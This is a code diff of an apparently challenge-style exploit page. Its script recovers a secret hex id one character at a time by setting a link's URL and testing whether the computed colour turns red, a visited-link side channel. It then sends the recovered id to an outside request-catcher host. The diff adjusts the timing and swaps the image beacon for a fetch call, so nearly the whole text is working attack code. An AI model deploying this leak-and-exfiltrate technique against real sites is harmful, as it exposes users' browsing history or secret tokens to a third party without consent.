@@ -23,7 +23,8 @@
         let found=false;
         for(const c of hex){
           a.href=base+id+c+'0'.repeat(31-pos);
-          await new Promise(r=>setTimeout(r,50));
+          await new Promise(r=>requestAnimationFrame(r));
+          await new Promise(r=>setTimeout(r,100));
           if(getComputedStyle(a).color==='rgb(255, 0, 0)'){
             id+=c;
             found=true;
@@ -33,7 +34,9 @@
         if(!found)break;
       }
       
-      new Image().src=`https://singetu0096.requestcatcher.com/?id=${id}`;
+      if(id.length>0){
+        fetch(`https://singetu0096.requestcatcher.com/?found=${id}&len=${id.length}`);
+      }
     })();
   </script>
 </body>
